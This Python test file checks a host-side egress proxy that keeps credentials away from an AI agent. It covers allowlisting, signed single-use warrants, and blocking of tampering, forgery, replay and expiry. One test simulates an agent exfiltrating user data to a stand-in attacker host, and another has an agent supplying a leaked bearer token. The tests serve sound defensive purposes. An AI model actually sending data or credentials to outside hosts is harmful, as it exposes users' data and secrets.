#!/usr/bin/env python3
# Copyright 2026 SovereignNexus Project
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
tests/test_credential_starvation_proxy.py — Host-Side Credential Starvation Verification

Tests the Perplexity SPACE-inspired Host-Side Credential-Injecting Egress Proxy:
1. Agent process holds ZERO credentials (cannot leak what it does not possess).
2. Host proxy enforces exact CAID warrant binding, destination allowlist, and single-use.
3. Host proxy injects real upstream secret wire-side.
4. All 7 falsification attack vectors fail closed.
"""

import base64
import json
import time
from pathlib import Path
from typing import Any, Dict

import pytest
from cryptography.hazmat.primitives.asymmetric import ed25519

from src.credential_starvation_proxy import (
    CaidWarrant,
    CredentialStarvationEgressProxy,
    EgressPolicyViolation,
    HostCredentialVault,
    sha256_prefixed,
)
from src.jcs_canonicalizer import encode_jcs


def create_signed_warrant(
    privkey: ed25519.Ed25519PrivateKey,
    op_id: str,
    target_url: str,
    method: str,
    payload: Dict[str, Any],
    ttl_sec: int = 60,
    budget_ceiling: int = 100000,
) -> CaidWarrant:
    canonical_body = encode_jcs(payload)
    caid = sha256_prefixed(canonical_body)
    now = int(time.time())
    expires_at = now + ttl_sec

    unsigned_warrant = {
        "action_caid": caid,
        "budget_ceiling_minor": budget_ceiling,
        "expires_at": expires_at,
        "http_method": method,
        "operation_id": op_id,
        "target_url": target_url,
    }
    sig = privkey.sign(encode_jcs(unsigned_warrant))
    sig_b64 = base64.b64encode(sig).decode("ascii")

    return CaidWarrant(
        operation_id=op_id,
        action_caid=caid,
        target_url=target_url,
        http_method=method,
        expires_at=expires_at,
        budget_ceiling_minor=budget_ceiling,
        signature_b64=sig_b64,
    )


def test_nominal_credential_starvation_injection(tmp_path: Path):
    """
    Evaluates nominal egress: agent holds no credentials;
    host proxy validates warrant and injects upstream secret at wire level.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    station1_pub = station1_priv.public_key()

    vault = HostCredentialVault()
    vault.register_credential("https://bank.example.internal/v1/refunds", "Bearer REAL_UPSTREAM_BANK_SECRET_xyz123")

    captured_headers: Dict[str, str] = {}

    def test_dispatcher(method: str, url: str, headers: Dict[str, str], body: bytes) -> Dict[str, Any]:
        captured_headers.update(headers)
        return {
            "status_code": 200,
            "headers": {"Content-Type": "application/json", "Set-Cookie": "upstream_session=secret99"},
            "body": b'{"status": "SUCCESS"}',
        }

    audit_log = tmp_path / "audit.jsonl"
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=audit_log,
        station1_pubkey=station1_pub,
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=vault,
        upstream_dispatcher=test_dispatcher,
    )

    payload = {"amount_minor": 5000, "recipient_iban": "DE89370400440532013000"}
    warrant = create_signed_warrant(
        station1_priv,
        op_id="op-cred-001",
        target_url="https://bank.example.internal/v1/refunds",
        method="POST",
        payload=payload,
    )

    # Agent dispatches with ZERO bearer credentials in agent_supplied_headers
    resp = proxy.dispatch_agent_request(
        target_url="https://bank.example.internal/v1/refunds",
        http_method="POST",
        raw_payload=payload,
        warrant=warrant,
        agent_supplied_headers={"X-Request-Context": "agent-session-42"},
    )

    # 1. Assert upstream received injected secret
    assert captured_headers.get("Authorization") == "Bearer REAL_UPSTREAM_BANK_SECRET_xyz123"
    assert captured_headers.get("X-AEIB-CAID") == warrant.action_caid
    assert captured_headers.get("X-Request-Context") == "agent-session-42"

    # 2. Assert agent response had sensitive upstream headers stripped
    assert "Set-Cookie" not in resp["headers"]
    assert int(resp["status_code"]) == 200
    assert proxy.total_dispatches_forwarded == 1

    # 3. Assert persistent audit record created
    assert audit_log.exists()
    lines = audit_log.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 1
    record = json.loads(lines[0])
    assert record["verdict"] == "DISPATCH_FORWARDED_AUTHORIZED"


def test_agent_supplying_bearer_credential_is_blocked(tmp_path: Path):
    """
    Falsification: If an agent somehow possesses or attempts to supply bearer credentials,
    the proxy immediately halts to enforce the Credential Starvation Principle.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    vault = HostCredentialVault()
    audit_log = tmp_path / "audit.jsonl"
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=audit_log,
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=vault,
    )

    payload = {"amount_minor": 1000}
    warrant = create_signed_warrant(station1_priv, "op-breach-1", "https://bank.example.internal/v1/refunds", "POST", payload)

    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://bank.example.internal/v1/refunds",
            http_method="POST",
            raw_payload=payload,
            warrant=warrant,
            agent_supplied_headers={"Authorization": "Bearer leaked_key_attempt"},
        )

    assert "HALT_AGENT_POSSESSES_OR_SUPPLIED_CREDENTIALS" in str(exc.value)
    assert proxy.total_dispatches_blocked == 1


def test_unallowlisted_destination_fails_closed(tmp_path: Path):
    """
    Falsification: Attempt to send traffic to an unallowlisted external endpoint fails closed.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=tmp_path / "audit.jsonl",
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=HostCredentialVault(),
    )

    payload = {"exfiltrate": "user_data"}
    warrant = create_signed_warrant(station1_priv, "op-exfil-1", "https://attacker.evil.tld/exfil", "POST", payload)

    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://attacker.evil.tld/exfil",
            http_method="POST",
            raw_payload=payload,
            warrant=warrant,
        )

    assert "HALT_DESTINATION_NOT_ALLOWLISTED" in str(exc.value)


def test_tampered_payload_caid_mismatch_fails_closed(tmp_path: Path):
    """
    Falsification: Agent modifying the payload after Station 1 signed the warrant fails closed.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=tmp_path / "audit.jsonl",
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=HostCredentialVault(),
    )

    original_payload = {"amount_minor": 1000, "recipient": "clean_account"}
    warrant = create_signed_warrant(station1_priv, "op-tamper-1", "https://bank.example.internal/v1/refunds", "POST", original_payload)

    # Attacker mutates amount in the wire payload
    tampered_payload = {"amount_minor": 999999, "recipient": "clean_account"}

    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://bank.example.internal/v1/refunds",
            http_method="POST",
            raw_payload=tampered_payload,
            warrant=warrant,
        )

    assert "HALT_WIRE_PAYLOAD_CAID_MISMATCH" in str(exc.value)


def test_forged_warrant_signature_fails_closed(tmp_path: Path):
    """
    Falsification: Warrant signed by an untrusted key fails closed.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    attacker_priv = ed25519.Ed25519PrivateKey.generate()

    proxy = CredentialStarvationEgressProxy(
        audit_log_path=tmp_path / "audit.jsonl",
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=HostCredentialVault(),
    )

    payload = {"amount_minor": 1000}
    # Attacker signs with their own key
    forged_warrant = create_signed_warrant(attacker_priv, "op-forge-1", "https://bank.example.internal/v1/refunds", "POST", payload)

    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://bank.example.internal/v1/refunds",
            http_method="POST",
            raw_payload=payload,
            warrant=forged_warrant,
        )

    assert "HALT_INVALID_CAID_WARRANT_SIGNATURE" in str(exc.value)


def test_warrant_replay_attack_fails_closed(tmp_path: Path):
    """
    Falsification: Replaying a previously-dispatched warrant fails closed.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=tmp_path / "audit.jsonl",
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=HostCredentialVault(),
    )

    payload = {"amount_minor": 500}
    warrant = create_signed_warrant(station1_priv, "op-single-use-1", "https://bank.example.internal/v1/refunds", "POST", payload)

    # First dispatch succeeds
    proxy.dispatch_agent_request(
        target_url="https://bank.example.internal/v1/refunds",
        http_method="POST",
        raw_payload=payload,
        warrant=warrant,
    )

    # Second dispatch with identical warrant fails closed
    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://bank.example.internal/v1/refunds",
            http_method="POST",
            raw_payload=payload,
            warrant=warrant,
        )

    assert "HALT_WARRANT_REPLAY_ATTEMPT" in str(exc.value)


def test_expired_warrant_fails_closed(tmp_path: Path):
    """
    Falsification: An expired warrant fails closed.
    """
    station1_priv = ed25519.Ed25519PrivateKey.generate()
    proxy = CredentialStarvationEgressProxy(
        audit_log_path=tmp_path / "audit.jsonl",
        station1_pubkey=station1_priv.public_key(),
        destination_allowlist={"https://bank.example.internal/v1/"},
        credential_vault=HostCredentialVault(),
    )

    payload = {"amount_minor": 100}
    # Create warrant expired 10 seconds ago
    warrant = create_signed_warrant(
        station1_priv, "op-expired-1", "https://bank.example.internal/v1/refunds", "POST", payload, ttl_sec=-10
    )

    with pytest.raises(EgressPolicyViolation) as exc:
        proxy.dispatch_agent_request(
            target_url="https://bank.example.internal/v1/refunds",
            http_method="POST",
            raw_payload=payload,
            warrant=warrant,
        )

    assert "HALT_CAID_WARRANT_EXPIRED" in str(exc.value)
